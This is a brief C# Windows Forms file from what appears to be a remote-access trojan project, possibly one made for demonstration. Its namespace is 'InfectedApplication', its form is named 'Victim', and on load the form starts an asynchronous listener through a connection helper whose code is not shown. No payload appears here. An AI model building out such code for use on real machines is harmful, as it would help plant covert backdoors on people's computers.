using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using InfectedApplication.Helper;
using System.Windows.Forms;


namespace InfectedApplication
{
    public partial class Victim : Form
    {
        public VictimConnectionHelper vch;
        public Victim()
        {
            InitializeComponent();
            vch = new VictimConnectionHelper();
        }

        private void Victim_Load(object sender, EventArgs e)
        {
            vch.StartAsyncListening();
        }
    }
}
